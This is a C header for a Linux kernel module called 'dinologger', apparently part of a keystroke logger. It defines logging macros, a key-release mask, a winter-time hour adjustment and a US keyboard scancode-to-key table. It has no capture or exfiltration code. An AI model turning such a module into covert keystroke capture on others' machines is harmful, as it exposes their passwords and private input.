#pragma once

#include "linux/init.h"
#include "linux/module.h"
#include "linux/fs.h"
#include "linux/miscdevice.h"
#include "linux/interrupt.h"
#include "asm/io.h"
#include "linux/ktime.h"
#include "linux/rtc.h"

#define DEVICE_NAME "dinologger"
#define LOG(msg) printk(KERN_NOTICE DEVICE_NAME ": " msg "\n")
#define LOGF(msg, ...) printk(KERN_NOTICE DEVICE_NAME ": " msg "\n", __VA_ARGS__)

#define RELEASE 0b10000000
#define CANCEL_RELEASE 0b01111111
#define WINTER_TIME(x)															\
		if (x.tm_yday <= 89 || x.tm_yday >= 299) {									\
			x.tm_hour = (x.tm_hour + 1) % 24;									\
		}

#define unmapped_end                                                           \
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, \
		0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0

#define ESCAPE "Escape"
#define BACKSPACE "Delete"
#define TAB "Tab"
#define ENTER "Enter"
#define CTRL "Ctrl"
#define LSHIFT "Left Shift"
#define RSHIFT "Right Shift"
#define ALT "Alt"
#define SPACE "Space"
#define CAPS_LOCK "Caps Lock"
#define F1 "F1"
#define F2 "F2"
#define F3 "F3"
#define F4 "F4"
#define F5 "F5"
#define F6 "F6"
#define F7 "F7"
#define F8 "F8"
#define F9 "F9"
#define F10 "F10"
#define F11 "F11"
#define F12 "F12"
#define NUM_LOCK "Num Lock"
#define SCROLL_LOCK "Scroll Lock"
#define HOME "Home"
#define UP "Up"
#define LEFT "Left"
#define RIGHT "Right"
#define DOWN "Down"
#define PAGE_UP "Page Up"
#define PAGE_DOWN "Page Down"
#define END "End"
#define INSERT "Insert"
#define DELETE "Delete"
#define UNMAPPED "Unmapped"

#define US_KBMAP                                                               \
	0, ESCAPE, "\'1\'", "\'2\'", "\'3\'", "\'4\'", "\'5\'", "\'6\'", "\'7\'", "\'8\'", "\'9\'", "\'0\'", "\'-\'", "\'=\'",     \
		BACKSPACE, TAB, "\'q\'", "\'w\'", "\'e\'", "\'r\'", "\'t\'", "\'y\'", "\'u\'", "\'i\'", "\'o\'", "\'p\'", "\'[\'", \
		"\']\'", ENTER, CTRL, "\'a\'", "\'s\'", "\'d\'", "\'f\'", "\'g\'", "\'h\'", "\'j\'", "\'k\'", "\'l\'", "\';\'",    \
		"\"\'\"", "\'`\'", LSHIFT, "\'\\\'", "\'z\'", "\'x\'", "\'c\'", "\'v\'", "\'b\'", "\'n\'", "\'m\'", "\',\'", "\'.\'",  \
		"\'/\'", RSHIFT, "\'*\'", ALT, SPACE, CAPS_LOCK, F1, F2, F3, F4, F5, F6, F7,   \
		F8, F9, F10, NUM_LOCK, SCROLL_LOCK, HOME, UP, PAGE_UP, "\'-\'", LEFT,      \
		UNMAPPED, RIGHT, "\'+\'", END, DOWN, PAGE_DOWN, INSERT, DELETE, UNMAPPED,  \
		UNMAPPED, UNMAPPED, F11, F12, unmapped_end
